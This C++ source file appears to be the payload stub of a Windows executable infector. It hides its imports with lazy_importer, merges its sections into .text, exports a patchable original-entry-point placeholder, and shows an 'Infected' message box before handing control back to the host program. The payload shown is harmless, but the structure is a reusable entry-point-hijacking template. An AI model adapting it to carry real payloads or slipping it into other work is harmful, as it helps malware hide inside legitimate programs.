#include <Windows.h>
#include <lazy_importer.hpp>
#pragma comment(linker, "/merge:.rdata=.text")
#pragma comment(linker, "/merge:.pdata=.text")
#pragma comment(linker, "/merge:.data=.text")

typedef
void
(_stdcall* EntryPoint_t)(
	void
	);

extern "C"
__declspec(dllexport)
EntryPoint_t OriginalEntryPoint = reinterpret_cast<EntryPoint_t>(0xCCCCCCCCCCCCCCCC);

extern "C"
__declspec(dllexport)
int
main(
	void
)
{
	auto hKernel32 = LI_FN(GetModuleHandleW)(L"Kernel32.dll");
	auto hUser32 = LI_FN(GetModuleHandleW)(L"User32.dll");

	LI_FN(MessageBoxW)(nullptr, L"Hello World", L"Infected", MB_OK);

	OriginalEntryPoint();
	return 0;
}
